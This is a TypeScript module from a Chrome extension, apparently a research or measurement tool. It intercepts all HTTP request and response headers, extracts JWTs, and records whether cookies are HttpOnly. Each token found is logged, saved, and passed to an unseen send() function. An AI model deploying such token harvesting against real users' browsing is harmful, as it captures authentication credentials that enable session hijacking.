import { save, send } from './utilities'
import { findJWT } from './jwt'
import type { JWT, JWTMessage } from './jwt'

const isHttpOnly = (value: string) => {
  // case insensitive as per: https://datatracker.ietf.org/doc/html/rfc6265#section-5.2.6
  return value.toLowerCase().includes('httponly')
}

const processHeader = (
  req: chrome.webRequest.ResourceRequest,
  header: chrome.webRequest.HttpHeader,
  match: JWT
) => {
  let name = header.name
  if (name.toLowerCase() === 'set-cookie' && header.value !== undefined) {
    const httpOnly = isHttpOnly(header.value)
    name += `; httpOnly=${httpOnly.toString()}`
  }
  const data: JWTMessage = { jwt: match, url: req.url, type: 'H', name: name }
  console.log('JWT FOUND', data)
  save(data, 'benign-success')
  send(data)
}

const onHeaderHandler = (
  req: chrome.webRequest.ResourceRequest,
  headers: chrome.webRequest.HttpHeader[]
) => {
  headers.forEach((header) => {
    if (header.value === undefined) {
      return
    }
    const matches = findJWT(header.value)
    for (const match of matches) {
      processHeader(req, header, match)
    }
  })
}

const onSendHeadersHandler = (
  req: chrome.webRequest.WebRequestHeadersDetails
) => {
  if (req.requestHeaders !== undefined) {
    onHeaderHandler(req, req.requestHeaders)
  }
}

const onHeadersReceivedHandler = (
  req: chrome.webRequest.WebResponseHeadersDetails
) => {
  if (req.responseHeaders !== undefined) {
    onHeaderHandler(req, req.responseHeaders)
  }
}

export { onSendHeadersHandler, onHeadersReceivedHandler }
